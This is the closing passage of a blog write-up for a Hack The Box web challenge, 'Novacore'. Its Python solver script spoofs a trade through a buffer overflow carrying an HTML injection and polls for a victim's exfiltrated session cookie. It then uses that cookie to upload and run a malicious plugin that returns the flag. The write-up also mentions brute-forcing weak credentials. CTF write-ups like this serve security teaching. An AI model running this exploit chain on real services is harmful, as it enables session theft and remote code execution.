</span></span><span style="display:flex;"><span>spoofed_val <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;symbol|</span><span style="color:#e6db74">{</span>html_injection<span style="color:#e6db74">}</span><span style="color:#e6db74">|action|buy|price|761.01&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> len(spoofed_val) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">-</span> len(trade_prefix)
</span></span><span style="display:flex;"><span>padding2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">-</span> len(spoofed_key)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> padding <span style="color:#f92672">+</span> spoofed_key <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> padding2 <span style="color:#f92672">+</span> spoofed_val
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">* Current value length:&#34;</span>, len(trade_prefix))
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">* Spoofed key length:&#34;</span>, len(spoofed_key))
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">* padding  = 256-</span><span style="color:#e6db74">{</span>len(trade_prefix)<span style="color:#e6db74">}</span><span style="color:#e6db74"> = </span><span style="color:#e6db74">{</span>padding<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">* padding2 = 256-</span><span style="color:#e6db74">{</span>len(spoofed_key)<span style="color:#e6db74">}</span><span style="color:#e6db74"> = </span><span style="color:#e6db74">{</span>padding2<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">* Sending payload:&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>padding<span style="color:#e6db74">}</span><span style="color:#e6db74">*&#39;A&#39; + &#39;</span><span style="color:#e6db74">{</span>spoofed_key<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; + </span><span style="color:#e6db74">{</span>padding2<span style="color:#e6db74">}</span><span style="color:#e6db74">*&#39;B&#39; + &#39;</span><span style="color:#e6db74">{</span>spoofed_val<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>,
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;/api/edit_trade&#34;</span>, json<span style="color:#f92672">=</span>dict(trade_id<span style="color:#f92672">=</span>trade[<span style="color:#e6db74">&#34;key&#34;</span>], price<span style="color:#f92672">=</span>payload))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">&#34;successfully&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;message&#34;</span>]
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">+ Spoofed trade via overflow&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">8. Polling for exfiltrated victim cookie (&lt; 1min)&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">* &#34;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> r <span style="color:#f92672">:=</span> api<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;/front_end_error/view/exfill&#34;</span>, json<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;=&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>        session <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>json()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;=&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;.&#34;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">+ session cookie =&#34;</span>, session)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">10. Uploading dataset in plugins directory&#34;</span>)
</span></span><span style="display:flex;"><span>plugin_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;getflag.tar&#34;</span>
</span></span><span style="display:flex;"><span>plugin_dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/app/application/plugins/&#34;</span>
</span></span><span style="display:flex;"><span>admin <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>Client(base_url<span style="color:#f92672">=</span>url, cookies<span style="color:#f92672">=</span>dict(session<span style="color:#f92672">=</span>session))
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> admin<span style="color:#f92672">.</span>post(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;/upload_dataset&#34;</span>,
</span></span><span style="display:flex;"><span>    files<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;dataset_file&#34;</span>: (plugin_dir <span style="color:#f92672">+</span> plugin_name, plugin_bytes)},
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">+ Dataset uploaded&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">11. Executing plugin and getting flag&#34;</span>)
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> admin<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;/run_plugin&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;plugin&#34;</span>: plugin_name})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[green]&#34;</span> <span style="color:#f92672">+</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;HTB{.+?}&#34;</span>, r<span style="color:#f92672">.</span>text)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;[/green]&#34;</span>)
</span></span></code></pre></div><p>Here is a snippet of it running:
<img alt="novacore_solver" src="/posts/novacore-a-never-ending-chain/novacore_solver.gif"></p>
<p>Interestingly, one team noticed that <strong>$RANDOM</strong> generated integers between 0 and 32767 which means that both email and password are feasibly bruteforce-able.</p>
<p>That team used a <code>bcrypt</code> oracle to bruteforce email and passwords independently, significantly reducing search space. This allowed them to unintendedly bypass a significant portion of the challenge (entire XSS chain).</p>
<p>And there you have it! A complete walkthrough of HTB&rsquo;s Novacore challenge.</p>
<p>I hope you enjoyed, do not hesitate to leave a comment and let me know what you think of this challenge, you can always contact me on Discord <strong>@aelmo1</strong> for questions and remarks.</p>
<p>See you in the next one!</p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        
        <span class="button next">
            <a href="/posts/htb-cyber-apocalypse-2025-writeup/">
                <span class="button__text">HTB Cyber Apocalypse 2025 Writeup - All Web</span>
                <span class="button__icon">â†’</span>
            </a>
        </span>
        
    </div>
</div>

  

  <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "elmosalamy" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>Â© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>







  
</div>

</body>
</html>
